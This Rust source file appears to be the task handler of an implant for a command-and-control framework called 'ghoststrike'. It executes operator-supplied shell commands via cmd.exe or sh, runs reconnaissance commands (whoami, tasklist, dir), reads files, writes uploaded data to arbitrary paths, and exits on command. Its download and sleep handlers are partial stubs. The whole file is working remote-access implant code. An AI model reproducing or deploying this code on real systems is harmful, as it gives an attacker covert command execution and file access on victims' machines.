use ghoststrike_common::{Task, TaskCommand};
use std::process::Command;

pub async fn execute_task(task: &Task) -> String {
    match &task.command {
        TaskCommand::Shell { cmd } => run_shell(cmd),
        TaskCommand::Pwd           => run_shell("cd"),
        TaskCommand::Whoami        => run_shell("whoami"),
        TaskCommand::Ps            => run_shell("tasklist"),
        TaskCommand::Ls { path }   => run_shell(&format!("dir \"{}\"", path)),
        TaskCommand::Sleep { .. }  => "sleep set".into(),
        TaskCommand::Exit          => {
            std::process::exit(0);
        }
        TaskCommand::Download { path } => {
            match std::fs::read(path) {
                Ok(b)  => format!("[file] {} bytes", b.len()),
                Err(e) => format!("[error] {e}"),
            }
        }
        TaskCommand::Upload { path, data } => {
            match std::fs::write(path, data) {
                Ok(_)  => format!("[upload] wrote {} bytes to {path}", data.len()),
                Err(e) => format!("[error] {e}"),
            }
        }
    }
}

fn run_shell(cmd: &str) -> String {
    #[cfg(target_os = "windows")]
    let output = Command::new("cmd.exe")
        .args(["/C", cmd])
        .output();

    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh")
        .args(["-c", cmd])
        .output();

    match output {
        Ok(o) => {
            let mut result = String::new();
            if !o.stdout.is_empty() {
                result.push_str(&String::from_utf8_lossy(&o.stdout));
            }
            if !o.stderr.is_empty() {
                result.push_str(&String::from_utf8_lossy(&o.stderr));
            }
            result
        }
        Err(e) => format!("[error] {e}"),
    }
}
